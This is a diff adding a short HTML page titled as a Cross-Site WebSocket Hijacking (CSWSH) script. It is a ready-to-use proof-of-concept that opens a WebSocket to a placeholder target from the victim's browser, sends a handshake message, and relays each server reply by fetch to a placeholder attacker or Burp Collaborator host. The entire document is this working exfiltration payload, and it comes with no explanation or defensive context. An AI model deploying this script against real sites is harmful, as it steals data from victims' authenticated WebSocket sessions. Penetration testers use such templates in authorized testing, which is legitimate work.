@@ -1,0 +1,14 @@
+<h1>Cross-Site WebSocket Hijacking (CSWSH) script</h1>
+<h3>check burp collaborator / your script logs for result of exploitation!</h3>
+<script>
+  
+  websocket = new WebSocket('wss://WSS-URL')
+  websocket.onopen = start
+  websocket.onmessage = handleReply
+  function start(event) {
+    websocket.send('MAIN MESSAGE Client sent to server AKA handsake!!!');
+  }
+  function handleReply(event) {
+    fetch('https://YourServerOrBurpCollaborator'+event.data, {mode: 'no-cors'})
+  }
+</script> 
